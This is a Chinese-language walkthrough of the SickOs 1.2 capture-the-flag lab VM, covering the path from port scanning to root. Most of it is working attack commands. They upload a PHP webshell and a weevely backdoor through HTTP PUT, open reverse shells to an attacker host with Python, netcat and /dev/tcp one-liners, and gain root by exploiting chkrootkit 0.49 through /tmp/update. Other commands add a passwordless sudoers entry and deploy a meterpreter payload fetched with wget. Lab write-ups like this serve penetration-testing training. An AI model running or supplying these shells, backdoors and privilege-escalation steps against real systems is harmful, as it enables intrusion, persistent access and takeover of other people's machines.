1、nmap 10.211.55.0/24 -sP
Nmap scan report for localhost (10.211.55.40)

2、全端口扫描nmap
nmap -sC -sV -A -T5 10.211.55.40

22/tcp open  ssh     OpenSSH 5.9p1
80/tcp open  http    lighttpd 1.4.28

对于SickOs1项目十二，该项目十三仅仅开启了两个端口22和80，思路很简单，就是web页面信息枚举ssh登录！


3、页面枚举

访问：http://10.211.55.40/     ---这是一张图

dirb http://10.211.55.40/
发现：http://10.211.55.40/test/
存在Parent Directory/文件目录，点击又跳到了图片处！发现左下角图示：lighttpd/1.4.28

Lighttpd是一个德国人领导的开源软件,其根本的目的是提供一个专门针对高性能网站,安全、快速、兼容性好并且灵活的web server环境。具有非常低的内存开销,cpu占用率低,效能好,以及丰富的模块等特点。

burpsuite测试put发现可以请求上传成功！
OPTIONS  ---查看到put


HTTP请求方法并不是只有GET和POST，只是最常用的。据RFC2616标准（现行的HTTP/1.1）得知，通常有以下8种方法：OPTIONS、GET、HEAD、POST、PUT、DELETE、TRACE和CONNECT。

接下来用OPTIONS来进行请求：OPTIONS一般是对CORS(跨域资源共享)枚举的
curl -v -X OPTIONS http://10.211.55.40/test

-v   ---列出详细的信息
-X   ---指定请求OPTIONS选项信息

< Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
Allow: ---允许使用，这里是允许使用的命令


4、webshell

方法1：
curl -v -X PUT -d '<?php system($_GET["cmd"]);?>' http://10.211.55.41/test/shell.php
http://10.211.55.41/test/shell.php?cmd=ls

nc -vlp 6677
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.211.55.19",6677));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

这里的system   passthru
------------------------

方法2：
weevely generate passdayu dayu.php

curl --upload-file dayu.php -v --url http://10.211.55.40/test/dayu.php -0

--upload-file  ---上传
-0   ---因为要接入http1.0或者http2，-0是自动会选择！

访问：http://10.211.55.40/test
发现成功上传！

weevely http://10.211.55.40/test/dayu.php passdayu
成功获得反弹shell！

------------------------

curl --upload-file 1.php -v --url http://10.211.55.40/test/1.php -0

/bin/nc 10.211.55.19 8888 -e /bin/bash



5、内网信息枚举

curl --upload-file linpeas.sh -v --url http://10.211.55.41/test/linpeas.sh -0
chmod +x linpeas.sh
./linpeas.sh

1）Linux version 3.11.0-15-generic   ---内核提权

2）Sudo version 1.8.3p1   ---可能存在sudo溢出提权

3）john:x:1000:1000:Ubuntu 12.x,,,:/home/john:/bin/bash
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),109(sambashare)   ---sudo权限提升

枚举计划任务：
find / -name cron* 2>/dev/null

cat /etc/crontab   ----存在计划任务
-----------
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
-----------
/etc/cron.daily
/etc/cron.weekly
/etc/cron.monthly
这三个目录下存在计划任务，开始枚举！写入！
https://blog.csdn.net/jixieyang3701/article/details/79410725


cd /etc/cron.daily
发现存在：chkrootkit

Rootkit是一个特殊的恶意软件，它可隐藏自身以及指定的文件、进程、网络、链接、端口等信息。Rootkit可通过加载特殊的驱动修改系统内核，进而达到隐藏信息的目的。Rootkit的三要素就是：隐藏、操纵、收集数据。
Rootkit具有隐身功能，无论静止时作为文件存在，还是活动时作为进程存在，都不会被察觉，它可能永远存在于计算机中。

Chkrootkit是一款用来检测rootkit的软件，运行环境为linux，可以直接通过http://www.chkrootkit.org/download/地址来下载，随后进行解压缩。


find / -name chkrootkit 2>/dev/null
/usr/sbin/chkrootkit     ---配置信息
/etc/cron.daily/chkrootkit   ---环境变量信息
该环境是存在Chkrootkit！

chkrootkit -V
chkrootkit version 0.49
searchsploit chkrootkit 0.49
cp /usr/share/exploitdb/exploits/linux/local/33899.txt .

33899 exp文件中说在/usr/sbin/chkrootkit配置110行中存在：
“file_port $i” 会调用$SLAPPER_FILES中指定的所有文件作为chkrootkit用户进行执行命令（通常是root），原因是file_port是空的，因为在变量赋值周围缺少引号！

exp：
将update可执行文件放在/tmp中，运行chkrootkit，文件/tmp/update将以root身份被执行！
两个条件：
1）tmp有写入权限
2）定期运行chkrootkit
那么将可以稳定拿shell！

防护手段：
file_port="$file_port $i"   ---加上引号


6、提权
------------
方法1：chkrootkit提权

printf '#!/bin/bash\nbash -i >& /dev/tcp/10.211.55.19/443 0>&1\n' >> /tmp/update
chmod 777 /tmp/update
nc -nlvp 443

------------
方法2：
给对方www-data加入sudo权限：
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
chmod +x /tmp/update

ls -la /etc/sudoers   ---过几分钟查看
sudo su          ----成功获得root权限
------------
方法3：
msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=10.211.55.19 LPORT=443 -o dayu.elf

use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set lport 443
set lhost 10.211.55.19
exploit -j

python -m SimpleHTTPServer 443
wget http://10.211.55.19:443/dayu.elf
mv dayu.elf /tmp/update
chmod +x update
等待会msf上线！

------------

7、防火墙查看

cd ~/
cat newRule
----------
:INPUT DROP [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT DROP [0:0]
-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 80 -j ACCEPT
-A INPUT -p tcp -m tcp --sport 8080 -j ACCEPT
-A INPUT -p tcp -m tcp --sport 443 -j ACCEPT
-A OUTPUT -p tcp -m tcp --sport 22 -j ACCEPT
-A OUTPUT -p tcp -m tcp --sport 80 -j ACCEPT
-A OUTPUT -p tcp -m tcp --dport 8080 -j ACCEPT
-A OUTPUT -p tcp -m tcp --dport 443 -j ACCEPT
COMMIT
------------
只有端口22、80、443、8080允许通过防火墙！


拓展小技巧：
1）MSF拿下root---php
遗留问题：msf-php拿shell无法执行命令




























